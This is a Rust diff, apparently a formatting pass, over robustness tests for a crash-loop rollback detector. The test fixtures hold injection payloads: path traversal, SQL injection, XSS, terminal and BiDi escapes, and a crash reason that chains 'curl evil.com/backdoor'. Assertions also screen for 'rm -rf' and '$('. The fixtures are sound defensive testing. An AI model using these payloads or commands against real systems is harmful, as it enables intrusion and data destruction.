@@ -1411,11 +1411,18 @@ mod tests {
 
         detector.record_crash(crash);
 
-        let decision = detector.evaluate_rollback("max-crashes", 1000000, "trace", &[trusted_pin()]);
+        let decision =
+            detector.evaluate_rollback("max-crashes", 1000000, "trace", &[trusted_pin()]);
 
         // Should not crash due to overflow
-        assert!(!decision.triggered, "Should not trigger with single crash even with max threshold");
-        assert!(decision.crash_count < u32::MAX, "Crash count should be reasonable");
+        assert!(
+            !decision.triggered,
+            "Should not trigger with single crash even with max threshold"
+        );
+        assert!(
+            decision.crash_count < u32::MAX,
+            "Crash count should be reasonable"
+        );
     }
 
     #[test]
@@ -1435,11 +1442,15 @@ mod tests {
 
         detector.record_crash(crash);
 
-        let decision = detector.evaluate_rollback("zero-window", 1000000, "trace", &[trusted_pin()]);
+        let decision =
+            detector.evaluate_rollback("zero-window", 1000000, "trace", &[trusted_pin()]);
 
         // Should handle zero window gracefully without division by zero
         assert_eq!(decision.window_secs, 0);
-        assert!(!decision.triggered, "Zero window should effectively disable detection");
+        assert!(
+            !decision.triggered,
+            "Zero window should effectively disable detection"
+        );
     }
 
     #[test]
@@ -1459,7 +1470,10 @@ mod tests {
 
         // Should handle empty connector ID gracefully
         assert_eq!(decision.connector_id, "");
-        assert!(!decision.rollback_allowed, "Empty connector ID should not allow rollback");
+        assert!(
+            !decision.rollback_allowed,
+            "Empty connector ID should not allow rollback"
+        );
     }
 
     #[test]
@@ -1468,12 +1482,12 @@ mod tests {
         let mut detector = CrashLoopDetector::new(config());
 
         let malformed_timestamps = [
-            "", // Empty timestamp
-            "invalid", // Non-ISO format
-            "2026-13-45T99:99:99Z", // Invalid date components
-            "not-a-timestamp-at-all", // Completely invalid
-            "2026-01-01", // Missing time component
-            "\0", // Null byte
+            "",                            // Empty timestamp
+            "invalid",                     // Non-ISO format
+            "2026-13-45T99:99:99Z",        // Invalid date components
+            "not-a-timestamp-at-all",      // Completely invalid
+            "2026-01-01",                  // Missing time component
+            "\0",                          // Null byte
             "2026-01-01T00:00:00Z\0extra", // Null byte in middle
         ];
 
@@ -1516,11 +1530,15 @@ mod tests {
 
         detector.record_crash(crash);
 
-        let decision = detector.evaluate_rollback("large-window", u64::MAX, "trace", &[trusted_pin()]);
+        let decision =
+            detector.evaluate_rollback("large-window", u64::MAX, "trace", &[trusted_pin()]);
 
         // Should handle extreme window size without overflow
         assert_eq!(decision.window_secs, u64::MAX);
-        assert!(!decision.triggered, "Single crash should not trigger in very large window");
+        assert!(
+            !decision.triggered,
+            "Single crash should not trigger in very large window"
+        );
     }
 
     #[test]
@@ -1551,12 +1569,16 @@ mod tests {
             },
         ];
 
-        let decision = detector.evaluate_rollback("hash-collision", 1000060, "trace", &conflicting_pins);
+        let decision =
+            detector.evaluate_rollback("hash-collision", 1000060, "trace", &conflicting_pins);
 
         // Should handle hash collision gracefully and prefer trusted pins
         assert!(decision.triggered);
         if let Some(ref target) = decision.rollback_target {
-            assert!(target.trusted, "Should prefer trusted pin even with hash collision");
+            assert!(
+                target.trusted,
+                "Should prefer trusted pin even with hash collision"
+            );
         }
     }
 
@@ -1578,8 +1600,10 @@ mod tests {
         }
 
         // Simulate concurrent evaluations
-        let decision1 = detector.evaluate_rollback(connector_id, 1000000, "trace1", &[trusted_pin()]);
-        let decision2 = detector.evaluate_rollback(connector_id, 1000001, "trace2", &[trusted_pin()]);
+        let decision1 =
+            detector.evaluate_rollback(connector_id, 1000000, "trace1", &[trusted_pin()]);
+        let decision2 =
+            detector.evaluate_rollback(connector_id, 1000001, "trace2", &[trusted_pin()]);
 
         // Should maintain consistency across concurrent-like operations
         assert_eq!(decision1.triggered, decision2.triggered);
@@ -1599,21 +1623,37 @@ mod tests {
         for i in 0..10000 {
             let crash = CrashEvent {
                 connector_id: format!("connector-{}", i % 100), // Cycle through 100 connectors
-                timestamp: format!("2026-01-01T{:02}:{:02}:{:02}Z", i / 3600, (i / 60) % 60, i % 60),
+                timestamp: format!(
+                    "2026-01-01T{:02}:{:02}:{:02}Z",
+                    i / 3600,
+                    (i / 60) % 60,
+                    i % 60
+                ),
                 reason: format!("memory pressure test crash {}", i),
             };
             detector.record_crash(crash);
         }
 
         // Should still function correctly under memory pressure
-        let decision = detector.evaluate_rollback("connector-0", 2000000, "trace", &[trusted_pin_for("connector-0")]);
+        let decision = detector.evaluate_rollback(
+            "connector-0",
+            2000000,
+            "trace",
+            &[trusted_pin_for("connector-0")],
+        );
 
         assert_eq!(decision.connector_id, "connector-0");
-        assert!(decision.crash_count > 0, "Should have recorded crashes for connector-0");
+        assert!(
+            decision.crash_count > 0,
+            "Should have recorded crashes for connector-0"
+        );
 
         // Verify that incidents are bounded properly
         let incidents = detector.list_incidents();
-        assert!(incidents.len() <= DEFAULT_MAX_INCIDENTS, "Incidents should be bounded to prevent memory exhaustion");
+        assert!(
+            incidents.len() <= DEFAULT_MAX_INCIDENTS,
+            "Incidents should be bounded to prevent memory exhaustion"
+        );
     }
 
     #[test]
@@ -1628,8 +1668,8 @@ mod tests {
             "connector\nwith\nnewlines",
             "connector\0with\0nulls",
             "connector-with-very-very-very-long-name-that-might-cause-issues-in-some-systems",
-            "连接器-中文-名称", // Chinese characters
-            "コネクター-日本語", // Japanese characters
+            "连接器-中文-名称",    // Chinese characters
+            "コネクター-日本語",   // Japanese characters
             "соединитель-русский", // Cyrillic characters
         ];
 
@@ -1712,11 +1752,7 @@ mod tests {
             let mut det = CrashLoopDetector::new(extreme_config);
 
             // Test near u64::MAX boundaries
-            let edge_times = vec![
-                u64::MAX - 10,
-                u64::MAX - 1,
-                u64::MAX,
-            ];
+            let edge_times = vec![u64::MAX - 10, u64::MAX - 1, u64::MAX];
 
             for &edge_time in &edge_times {
                 let event = crash("overflow_conn", "ts", "edge_time_test");
@@ -1730,7 +1766,8 @@ mod tests {
                 assert!(cutoff <= edge_time); // Verify no underflow
 
                 // Cooldown math should saturate properly
-                det.last_rollback_epoch_by_connector.insert("overflow_conn".to_string(), edge_time);
+                det.last_rollback_epoch_by_connector
+                    .insert("overflow_conn".to_string(), edge_time);
                 let remaining = det.cooldown_remaining_for("overflow_conn", edge_time);
                 assert!(remaining <= extreme_config.cooldown_secs);
             }
@@ -1793,7 +1830,8 @@ mod tests {
             // Interleaved evaluation attempts during crash recording
             let pin = trusted_pin_for(connector_id);
             for eval_time in [1003, 1005, 1007, 1009] {
-                let filtered_events: Vec<_> = events.iter()
+                let filtered_events: Vec<_> = events
+                    .iter()
                     .filter(|e| e.connector_id == connector_id)
                     .cloned()
                     .collect();
@@ -1814,9 +1852,10 @@ mod tests {
                     }
                     Err(err) => {
                         // Valid error states during race conditions
-                        assert!(matches!(err,
-                            CrashLoopError::CooldownActive { .. } |
-                            CrashLoopError::ThresholdExceeded { .. }
+                        assert!(matches!(
+                            err,
+                            CrashLoopError::CooldownActive { .. }
+                                | CrashLoopError::ThresholdExceeded { .. }
                         ));
                     }
                 }
@@ -1827,11 +1866,31 @@ mod tests {
         fn configuration_validation_extreme_edge_cases() {
             // Test configurations with extreme values
             let edge_configs = vec![
-                CrashLoopConfig { max_crashes: 0, window_secs: 0, cooldown_secs: 0 },
-                CrashLoopConfig { max_crashes: 1, window_secs: 1, cooldown_secs: 1 },
-                CrashLoopConfig { max_crashes: u32::MAX, window_secs: 1, cooldown_secs: 1 },
-                CrashLoopConfig { max_crashes: 1, window_secs: u64::MAX, cooldown_secs: 1 },
-                CrashLoopConfig { max_crashes: 1, window_secs: 1, cooldown_secs: u64::MAX },
+                CrashLoopConfig {
+                    max_crashes: 0,
+                    window_secs: 0,
+                    cooldown_secs: 0,
+                },
+                CrashLoopConfig {
+                    max_crashes: 1,
+                    window_secs: 1,
+                    cooldown_secs: 1,
+                },
+                CrashLoopConfig {
+                    max_crashes: u32::MAX,
+                    window_secs: 1,
+                    cooldown_secs: 1,
+                },
+                CrashLoopConfig {
+                    max_crashes: 1,
+                    window_secs: u64::MAX,
+                    cooldown_secs: 1,
+                },
+                CrashLoopConfig {
+                    max_crashes: 1,
+                    window_secs: 1,
+                    cooldown_secs: u64::MAX,
+                },
             ];
 
             for config in edge_configs {
@@ -1899,14 +1958,16 @@ mod tests {
             // Establish rollback baseline
             let event = crash("timing_conn", "ts", "setup");
             det.record_crash(&event, 1000);
-            let _ = det.evaluate(
-                "timing_conn",
-                &[event],
-                Some(&trusted_pin_for("timing_conn")),
-                1000,
-                "setup_trace",
-                "setup_ts",
-            ).unwrap();
+            let _ = det
+                .evaluate(
+                    "timing_conn",
+                    &[event],
+                    Some(&trusted_pin_for("timing_conn")),
+                    1000,
+                    "setup_trace",
+                    "setup_ts",
+                )
+                .unwrap();
 
             // Test timing boundary precision at cooldown edge
             let rollback_time = 1000;
@@ -1924,7 +1985,10 @@ mod tests {
                     assert!(in_cooldown, "cooldown should be active at time {test_time}");
                     assert!(remaining > 0 || test_time == cooldown_end);
                 } else {
-                    assert!(!in_cooldown, "cooldown should be inactive at time {test_time}");
+                    assert!(
+                        !in_cooldown,
+                        "cooldown should be inactive at time {test_time}"
+                    );
                     assert_eq!(remaining, 0);
                 }
             }
@@ -1939,39 +2003,79 @@ mod tests {
 
             // Test pin hash manipulation attacks
             let mut hash_tampered_pin = trusted_pin_for("target_conn");
-            hash_tampered_pin.pin_hash = "evil_hash_deadbeef00000000000000000000000000000000000000000000000".to_string();
+            hash_tampered_pin.pin_hash =
+                "evil_hash_deadbeef00000000000000000000000000000000000000000000000".to_string();
 
             let events = threshold_events("target_conn");
-            let result = det.evaluate("target_conn", &events, Some(&hash_tampered_pin), 1002, "tr-hash", "ts-hash");
-            assert!(result.is_ok(), "Hash manipulation should not affect rollback decision logic");
+            let result = det.evaluate(
+                "target_conn",
+                &events,
+                Some(&hash_tampered_pin),
+                1002,
+                "tr-hash",
+                "ts-hash",
+            );
+            assert!(
+                result.is_ok(),
+                "Hash manipulation should not affect rollback decision logic"
+            );
 
             // Test version manipulation attacks
             let mut version_tampered_pin = trusted_pin_for("target_conn");
             version_tampered_pin.version = "../../../etc/passwd".to_string(); // Path traversal
             version_tampered_pin.trusted = true; // Still trusted despite malicious version
 
-            let result = det.evaluate("target_conn", &events, Some(&version_tampered_pin), 1003, "tr-version", "ts-version");
-            assert!(result.is_ok(), "Version field manipulation should be handled as opaque identifier");
+            let result = det.evaluate(
+                "target_conn",
+                &events,
+                Some(&version_tampered_pin),
+                1003,
+                "tr-version",
+                "ts-version",
+            );
+            assert!(
+                result.is_ok(),
+                "Version field manipulation should be handled as opaque identifier"
+            );
 
             // Test pin substitution attack (trusted flag bypass)
             let mut substituted_pin = untrusted_pin();
             substituted_pin.trusted = true; // Direct flag manipulation
             substituted_pin.connector_id = "target_conn".to_string();
 
-            let result = det.evaluate("target_conn", &events, Some(&substituted_pin), 1004, "tr-subst", "ts-subst");
-            assert!(result.is_ok(), "Trust flag should be respected regardless of other fields");
+            let result = det.evaluate(
+                "target_conn",
+                &events,
+                Some(&substituted_pin),
+                1004,
+                "tr-subst",
+                "ts-subst",
+            );
+            assert!(
+                result.is_ok(),
+                "Trust flag should be respected regardless of other fields"
+            );
 
             // Test connector ID injection in pins
             let injection_ids = [
                 "target_conn\0injection",
                 "target_conn\ninjection",
-                "target_conn\x1b[2J", // ANSI escape
+                "target_conn\x1b[2J",          // ANSI escape
                 "\u{202E}nnoc_tegrat\u{202C}", // BiDi override
             ];
 
             for malicious_id in &injection_ids {
                 let mut injected_pin = trusted_pin_for(malicious_id);
-                let err = det.evaluate("target_conn", &events, Some(&injected_pin), 1005, "tr-inject", "ts-inject").unwrap_err();
+                let err = det
+                    .evaluate(
+                        "target_conn",
+                        &events,
+                        Some(&injected_pin),
+                        1005,
+                        "tr-inject",
+                        "ts-inject",
+                    )
+                    .unwrap_err();
                 assert_eq!(err.code(), "CLD_PIN_CONNECTOR_MISMATCH");
             }
 
@@ -1980,8 +2084,18 @@ mod tests {
             massive_pin.version = "v".repeat(1_000_000); // 1MB version string
             massive_pin.pin_hash = "a".repeat(1_000_000); // 1MB hash
 
-            let result = det.evaluate("target_conn", &events, Some(&massive_pin), 1006, "tr-massive", "ts-massive");
-            assert!(result.is_ok(), "Massive pin fields should be handled gracefully");
+            let result = det.evaluate(
+                "target_conn",
+                &events,
+                Some(&massive_pin),
+                1006,
+                "tr-massive",
+                "ts-massive",
+            );
+            assert!(
+                result.is_ok(),
+                "Massive pin fields should be handled gracefully"
+            );
         }
 
         #[test]
@@ -2011,8 +2125,8 @@ mod tests {
 
             // Test integer wraparound in window calculations
             let wraparound_cases = [
-                (0, 1), // Wraparound at zero
-                (1, u64::MAX), // Massive window
+                (0, 1),                    // Wraparound at zero
+                (1, u64::MAX),             // Massive window
                 (u64::MAX - 50, u64::MAX), // Near-max boundary
             ];
 
@@ -2021,7 +2135,10 @@ mod tests {
                 det.record_crash(&event, crash_time);
 
                 let count = det.crashes_in_window_for("wrap_conn", eval_time);
-                assert!(count <= 1, "Window calculation should use saturating arithmetic");
+                assert!(
+                    count <= 1,
+                    "Window calculation should use saturating arithmetic"
+                );
             }
 
             // Test sliding window boundary precision
@@ -2036,19 +2153,21 @@ mod tests {
 
             // Test boundary conditions
             let boundary_tests = [
-                (base_time + window_size - 1, 5), // Just inside window
-                (base_time + window_size, 4),     // Boundary crash excluded
-                (base_time + window_size + 1, 4), // Clearly outside
-                (base_time + window_size + 50, 3), // More exclusions
-                (base_time + window_size + 99, 1), // Only last crash
+                (base_time + window_size - 1, 5),   // Just inside window
+                (base_time + window_size, 4),       // Boundary crash excluded
+                (base_time + window_size + 1, 4),   // Clearly outside
+                (base_time + window_size + 50, 3),  // More exclusions
+                (base_time + window_size + 99, 1),  // Only last crash
                 (base_time + window_size + 100, 0), // All excluded
             ];
 
             for (eval_time, expected_count) in boundary_tests {
                 let actual_count = det.crashes_in_window_for("precision_conn", eval_time);
-                assert_eq!(actual_count, expected_count,
+                assert_eq!(
+                    actual_count, expected_count,
                     "Window boundary at eval_time={} should have {} crashes, got {}",
-                    eval_time, expected_count, actual_count);
+                    eval_time, expected_count, actual_count
+                );
             }
 
             // Test massive time gaps (overflow protection)
@@ -2056,7 +2175,10 @@ mod tests {
             det.record_crash(&event, 1000);
 
             let far_future_eval = det.crashes_in_window_for("gap_conn", u64::MAX);
-            assert_eq!(far_future_eval, 0, "Massive time gaps should exclude all crashes");
+            assert_eq!(
+                far_future_eval, 0,
+                "Massive time gaps should exclude all crashes"
+            );
         }
 
         #[test]
@@ -2068,10 +2190,10 @@ mod tests {
                 "trace\x00null_injection",
                 "trace\nlog_injection",
                 "trace\r\nheader_injection",
-                "\x1b[2Jtrace\x1b[H", // Terminal escape
-                "trace\u{202E}evil\u{202C}", // BiDi override
+                "\x1b[2Jtrace\x1b[H",               // Terminal escape
+                "trace\u{202E}evil\u{202C}",        // BiDi override
                 "trace'; DROP TABLE incidents; --", // SQL injection
-                "<script>alert('xss')</script>", // XSS injection
+                "<script>alert('xss')</script>",    // XSS injection
             ];
 
             for (idx, malicious_trace) in injection_traces.iter().enumerate() {
@@ -2079,13 +2201,25 @@ mod tests {
                 record_threshold_crashes(&mut det, &connector_id, 1000 + (idx * 100));
                 let events = threshold_events(&connector_id);
 
-                let result = det.evaluate(&connector_id, &events, Some(&trusted_pin_for(&connector_id)),
-                    1002 + (idx * 100), malicious_trace, "safe_timestamp");
+                let result = det.evaluate(
+                    &connector_id,
+                    &events,
+                    Some(&trusted_pin_for(&connector_id)),
+                    1002 + (idx * 100),
+                    malicious_trace,
+                    "safe_timestamp",
+                );
 
-                assert!(result.is_ok(), "Trace ID injection should not crash evaluation");
+                assert!(
+                    result.is_ok(),
+                    "Trace ID injection should not crash evaluation"
+                );
 
                 let incident_count = det.incidents.len();
-                assert!(incident_count > idx, "Incident should be recorded despite injection");
+                assert!(
+                    incident_count > idx,
+                    "Incident should be recorded despite injection"
+                );
 
                 // Verify injection is preserved as-is (no interpretation)
                 let last_incident = &det.incidents[incident_count - 1];
@@ -2105,10 +2239,19 @@ mod tests {
                 record_threshold_crashes(&mut det, connector_id, 2000);
                 let events = threshold_events(connector_id);
 
-                let result = det.evaluate(connector_id, &events, Some(&trusted_pin_for(connector_id)),
-                    2002, "clean_trace", malicious_timestamp);
+                let result = det.evaluate(
+                    connector_id,
+                    &events,
+                    Some(&trusted_pin_for(connector_id)),
+                    2002,
+                    "clean_trace",
+                    malicious_timestamp,
+                );
 
-                assert!(result.is_ok(), "Timestamp injection should not crash evaluation");
+                assert!(
+                    result.is_ok(),
+                    "Timestamp injection should not crash evaluation"
+                );
             }
 
             // Test crash event field injection
@@ -2144,8 +2287,14 @@ mod tests {
                 record_threshold_crashes(&mut det, &attack_connector, 4000 + attack_idx);
                 let events = threshold_events(&attack_connector);
 
-                let _ = det.evaluate(&attack_connector, &events, Some(&trusted_pin_for(&attack_connector)),
-                    4002 + attack_idx, &format!("capacity_trace_{}", attack_idx), "capacity_ts");
+                let _ = det.evaluate(
+                    &attack_connector,
+                    &events,
+                    Some(&trusted_pin_for(&attack_connector)),
+                    4002 + attack_idx,
+                    &format!("capacity_trace_{}", attack_idx),
+                    "capacity_ts",
+                );
             }
 
             // Should respect bounded capacity
@@ -2172,7 +2321,10 @@ mod tests {
                 // Periodically verify system still responds
                 if pollution_idx % 10_000 == 0 {
                     assert!(!det.is_looping_for(&polluted_connector, 1000 + pollution_idx));
-                    assert_eq!(det.crashes_in_window_for(&polluted_connector, 1000 + pollution_idx), 1);
+                    assert_eq!(
+                        det.crashes_in_window_for(&polluted_connector, 1000 + pollution_idx),
+                        1
+                    );
                 }
             }
 
@@ -2185,7 +2337,10 @@ mod tests {
             let elapsed = start_time.elapsed();
 
             assert_eq!(total_crashes as usize, namespace_pollution_size);
-            assert!(elapsed.as_millis() < 1000, "Mass evaluation should complete in reasonable time");
+            assert!(
+                elapsed.as_millis() < 1000,
+                "Mass evaluation should complete in reasonable time"
+            );
 
             // Test selective connector queries remain efficient
             for test_idx in [0, 50_000, 99_999] {
@@ -2197,7 +2352,10 @@ mod tests {
             // Test memory cleanup behavior with sliding window
             let future_time = 2_000_000; // Far beyond all recorded crashes
             let future_total = det.crashes_in_window(future_time);
-            assert_eq!(future_total, 0, "Sliding window should exclude all old crashes");
+            assert_eq!(
+                future_total, 0,
+                "Sliding window should exclude all old crashes"
+            );
 
             // Verify internal cleanup occurs (implementation-dependent)
             for test_idx in [0, 25_000, 75_000] {
@@ -2220,8 +2378,16 @@ mod tests {
             // Establish initial rollback
             record_threshold_crashes(&mut det, attack_connector, 1000);
             let initial_events = threshold_events(attack_connector);
-            let initial_result = det.evaluate(attack_connector, &initial_events,
-                Some(&trusted_pin_for(attack_connector)), 1002, "initial", "ts_initial").unwrap();
+            let initial_result = det
+                .evaluate(
+                    attack_connector,
+                    &initial_events,
+                    Some(&trusted_pin_for(attack_connector)),
+                    1002,
+                    "initial",
+                    "ts_initial",
+                )
+                .unwrap();
             assert!(initial_result.rollback_allowed);
 
             // Test cooldown bypass through time manipulation
@@ -2236,11 +2402,20 @@ mod tests {
                 record_threshold_crashes(&mut det, attack_connector, bypass_time);
                 let bypass_events = threshold_events(attack_connector);
 
-                let result = det.evaluate(attack_connector, &bypass_events,
-                    Some(&trusted_pin_for(attack_connector)), bypass_time + 2,
-                    &format!("bypass_{}", bypass_time), "ts_bypass");
+                let result = det.evaluate(
+                    attack_connector,
+                    &bypass_events,
+                    Some(&trusted_pin_for(attack_connector)),
+                    bypass_time + 2,
+                    &format!("bypass_{}", bypass_time),
+                    "ts_bypass",
+                );
 
-                assert!(result.is_err(), "Cooldown should prevent rollback at time {}", bypass_time);
+                assert!(
+                    result.is_err(),
+                    "Cooldown should prevent rollback at time {}",
+                    bypass_time
+                );
                 assert_eq!(result.unwrap_err().code(), "CLD_COOLDOWN_ACTIVE");
             }
 
@@ -2249,10 +2424,19 @@ mod tests {
             record_threshold_crashes(&mut det, other_connector, 1050); // During first connector's cooldown
             let isolated_events = threshold_events(other_connector);
 
-            let isolated_result = det.evaluate(other_connector, &isolated_events,
-                Some(&trusted_pin_for(other_connector)), 1052, "isolated", "ts_isolated");
+            let isolated_result = det.evaluate(
+                other_connector,
+                &isolated_events,
+                Some(&trusted_pin_for(other_connector)),
+                1052,
+                "isolated",
+                "ts_isolated",
+            );
 
-            assert!(isolated_result.is_ok(), "Other connector should not be affected by cooldown");
+            assert!(
+                isolated_result.is_ok(),
+                "Other connector should not be affected by cooldown"
+            );
             assert!(isolated_result.unwrap().rollback_allowed);
 
             // Test cooldown calculation with arithmetic edge cases
@@ -2267,27 +2451,41 @@ mod tests {
                 let edge_connector = format!("edge_conn_{}", edge_time);
 
                 // Manually insert rollback time
-                det.last_rollback_epoch_by_connector.insert(edge_connector.clone(), edge_time);
+                det.last_rollback_epoch_by_connector
+                    .insert(edge_connector.clone(), edge_time);
 
                 // Test cooldown calculations near u64::MAX
                 let cooldown_active = det.in_cooldown_for(&edge_connector, edge_time + 100);
                 let remaining = det.cooldown_remaining_for(&edge_connector, edge_time + 100);
 
                 // Should handle overflow gracefully
-                assert!(cooldown_active, "Cooldown should be active for edge case {}", edge_time);
-                assert!(remaining <= 120, "Remaining time should be bounded for edge case {}", edge_time);
+                assert!(
+                    cooldown_active,
+                    "Cooldown should be active for edge case {}",
+                    edge_time
+                );
+                assert!(
+                    remaining <= 120,
+                    "Remaining time should be bounded for edge case {}",
+                    edge_time
+                );
             }
 
             // Test cooldown state consistency across multiple queries
             assert!(det.in_cooldown_for(attack_connector, 1100));
             assert!(det.in_cooldown_for(attack_connector, 1100)); // Repeated query
-            assert_eq!(det.cooldown_remaining_for(attack_connector, 1100),
-                       det.cooldown_remaining_for(attack_connector, 1100)); // Should be deterministic
+            assert_eq!(
+                det.cooldown_remaining_for(attack_connector, 1100),
+                det.cooldown_remaining_for(attack_connector, 1100)
+            ); // Should be deterministic
 
             // Test final cooldown expiration
             let post_cooldown_time = 1125; // Past cooldown period
             assert!(!det.in_cooldown_for(attack_connector, post_cooldown_time));
-            assert_eq!(det.cooldown_remaining_for(attack_connector, post_cooldown_time), 0);
+            assert_eq!(
+                det.cooldown_remaining_for(attack_connector, post_cooldown_time),
+                0
+            );
         }
 
         #[test]
@@ -2314,9 +2512,14 @@ mod tests {
                     None
                 };
 
-                let result = det.evaluate(race_connector, &race_events, pin.as_ref(),
-                    1002 + eval_idx, &format!("race_trace_{}", eval_idx),
-                    &format!("race_ts_{}", eval_idx));
+                let result = det.evaluate(
+                    race_connector,
+                    &race_events,
+                    pin.as_ref(),
+                    1002 + eval_idx,
+                    &format!("race_trace_{}", eval_idx),
+                    &format!("race_ts_{}", eval_idx),
+                );
 
                 evaluation_results.push((eval_idx, result));
 
@@ -2340,21 +2543,25 @@ mod tests {
                             successful_rollbacks += 1;
                         }
                     }
-                    Err(err) => {
-                        match err {
-                            CrashLoopError::CooldownActive { .. } => cooldown_blocks += 1,
-                            CrashLoopError::PinUntrusted { .. } => trust_errors += 1,
-                            CrashLoopError::NoKnownGood { .. } => no_pin_errors += 1,
-                            CrashLoopError::PinConnectorMismatch { .. } => trust_errors += 1,
-                            _ => panic!("Unexpected error at evaluation {}: {:?}", idx, err),
-                        }
-                    }
+                    Err(err) => match err {
+                        CrashLoopError::CooldownActive { .. } => cooldown_blocks += 1,
+                        CrashLoopError::PinUntrusted { .. } => trust_errors += 1,
+                        CrashLoopError::NoKnownGood { .. } => no_pin_errors += 1,
+                        CrashLoopError::PinConnectorMismatch { .. } => trust_errors += 1,
+                        _ => panic!("Unexpected error at evaluation {}: {:?}", idx, err),
+                    },
                 }
             }
 
             // Should have consistent behavior patterns
-            assert_eq!(successful_rollbacks, 1, "Should have exactly one successful rollback");
-            assert!(cooldown_blocks > 0, "Should have cooldown blocks after first rollback");
+            assert_eq!(
+                successful_rollbacks, 1,
+                "Should have exactly one successful rollback"
+            );
+            assert!(
+                cooldown_blocks > 0,
+                "Should have cooldown blocks after first rollback"
+            );
             assert!(trust_errors > 0, "Should have trust-related errors");
             assert!(no_pin_errors > 0, "Should have no-pin errors");
 
@@ -2364,7 +2571,10 @@ mod tests {
             // Verify final state consistency
             assert!(det.in_cooldown_for(race_connector, 2000));
             let final_crash_count = det.crashes_in_window_for(race_connector, 2000);
-            assert!(final_crash_count >= 3, "Should have accumulated crashes from race conditions");
+            assert!(
+                final_crash_count >= 3,
+                "Should have accumulated crashes from race conditions"
+            );
         }
     }
 
@@ -2396,7 +2606,6 @@ mod tests {
                 timestamp: "2024-01-01T12:02:00Z".to_string(),
                 reason: "memory_corruption".to_string(),
             },
-
             // Command injection in crash reasons
             CrashEvent {
                 connector_id: "victim_connector".to_string(),
@@ -2413,7 +2622,6 @@ mod tests {
                 timestamp: "2024-01-01T12:05:00Z".to_string(),
                 reason: "failure && curl evil.com/backdoor".to_string(),
             },
-
             // JSON injection in timestamps
             CrashEvent {
                 connector_id: "json_victim".to_string(),
@@ -2425,49 +2633,42 @@ mod tests {
                 timestamp: "2024-01-01T12:07:00Z}],\"evil\":[{\"timestamp".to_string(),
                 reason: "structure_injection".to_string(),
             },
-
             // Unicode bidirectional injection
             CrashEvent {
                 connector_id: "unicode\u{202E}detcennoC".to_string(), // Right-to-Left Override
                 timestamp: "2024-01-01T12:08:00Z".to_string(),
                 reason: "unicode\u{200B}hidden_crash".to_string(), // Zero-width space
             },
-
             // Path traversal injection
             CrashEvent {
                 connector_id: "../../../etc/passwd".to_string(),
                 timestamp: "2024-01-01T12:09:00Z".to_string(),
                 reason: "../../../var/log/evil.log".to_string(),
             },
-
             // SQL injection patterns
             CrashEvent {
                 connector_id: "connector'; DROP TABLE crashes; --".to_string(),
                 timestamp: "2024-01-01T12:10:00Z".to_string(),
                 reason: "' OR '1'='1".to_string(),
             },
-
             // Buffer overflow simulation
             CrashEvent {
                 connector_id: "A".repeat(100000),
                 timestamp: "2024-01-01T12:11:00Z".to_string(),
                 reason: "B".repeat(100000),
             },
-
             // Format string injection
             CrashEvent {
                 connector_id: "format_victim".to_string(),
                 timestamp: "2024-01-01T12:12:00Z".to_string(),
                 reason: "%n%s%x%d crash".to_string(),
             },
-
             // XML/HTML injection
             CrashEvent {
                 connector_id: "xml_victim".to_string(),
                 timestamp: "2024-01-01T12:13:00Z".to_string(),
                 reason: "<script>alert('xss')</script>".to_string(),
             },
-
             // Environment variable injection
             CrashEvent {
                 connector_id: "env_victim".to_string(),
@@ -2477,7 +2678,9 @@ mod tests {
         ];
 
         for (attack_idx, malicious_event) in malicious_crash_events.iter().enumerate() {
-            println!("Testing crash injection attack {}: {}", attack_idx,
+            println!(
+                "Testing crash injection attack {}: {}",
+                attack_idx,
                 if malicious_event.connector_id.len() > 50 {
                     format!("{}...", &malicious_event.connector_id[..50])
                 } else {
@@ -2487,7 +2690,11 @@ mod tests {
 
             // Attempt to inject malicious crash event
             let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                detector.record_crash(malicious_event.clone(), 1000 + attack_idx as u64, format!("injection_trace_{}", attack_idx));
+                detector.record_crash(
+                    malicious_event.clone(),
+                    1000 + attack_idx as u64,
+                    format!("injection_trace_{}", attack_idx),
+                );
             }));
 
             match injection_result {
@@ -2497,43 +2704,83 @@ mod tests {
 
                     // Verify crash event sanitization
                     for crash in crashes {
-                        assert!(!crash.connector_id.contains('\0'),
-                            "Attack {}: Connector ID should not contain null bytes", attack_idx);
-                        assert!(!crash.connector_id.contains("rm -rf"),
-                            "Attack {}: Connector ID should not contain command injection", attack_idx);
-                        assert!(!crash.connector_id.contains("DROP TABLE"),
-                            "Attack {}: Connector ID should not contain SQL injection", attack_idx);
+                        assert!(
+                            !crash.connector_id.contains('\0'),
+                            "Attack {}: Connector ID should not contain null bytes",
+                            attack_idx
+                        );
+                        assert!(
+                            !crash.connector_id.contains("rm -rf"),
+                            "Attack {}: Connector ID should not contain command injection",
+                            attack_idx
+                        );
+                        assert!(
+                            !crash.connector_id.contains("DROP TABLE"),
+                            "Attack {}: Connector ID should not contain SQL injection",
+                            attack_idx
+                        );
 
-                        assert!(!crash.reason.contains('\0'),
-                            "Attack {}: Crash reason should not contain null bytes", attack_idx);
-                        assert!(!crash.reason.contains("rm -rf"),
-                            "Attack {}: Crash reason should not contain command injection", attack_idx);
-                        assert!(!crash.reason.contains("$("),
-                            "Attack {}: Crash reason should not contain command substitution", attack_idx);
+                        assert!(
+                            !crash.reason.contains('\0'),
+                            "Attack {}: Crash reason should not contain null bytes",
+                            attack_idx
+                        );
+                        assert!(
+                            !crash.reason.contains("rm -rf"),
+                            "Attack {}: Crash reason should not contain command injection",
+                            attack_idx
+                        );
+                        assert!(
+                            !crash.reason.contains("$("),
+                            "Attack {}: Crash reason should not contain command substitution",
+                            attack_idx
+                        );
 
-                        assert!(!crash.timestamp.contains('\0'),
-                            "Attack {}: Timestamp should not contain null bytes", attack_idx);
-                        assert!(!crash.timestamp.contains("\"injected\":"),
-                            "Attack {}: Timestamp should not contain JSON injection", attack_idx);
+                        assert!(
+                            !crash.timestamp.contains('\0'),
+                            "Attack {}: Timestamp should not contain null bytes",
+                            attack_idx
+                        );
+                        assert!(
+                            !crash.timestamp.contains("\"injected\":"),
+                            "Attack {}: Timestamp should not contain JSON injection",
+                            attack_idx
+                        );
 
                         // Verify length limits
-                        assert!(crash.connector_id.len() <= 10000,
-                            "Attack {}: Connector ID should have reasonable length limit", attack_idx);
-                        assert!(crash.reason.len() <= 10000,
-                            "Attack {}: Crash reason should have reasonable length limit", attack_idx);
+                        assert!(
+                            crash.connector_id.len() <= 10000,
+                            "Attack {}: Connector ID should have reasonable length limit",
+                            attack_idx
+                        );
+                        assert!(
+                            crash.reason.len() <= 10000,
+                            "Attack {}: Crash reason should have reasonable length limit",
+                            attack_idx
+                        );
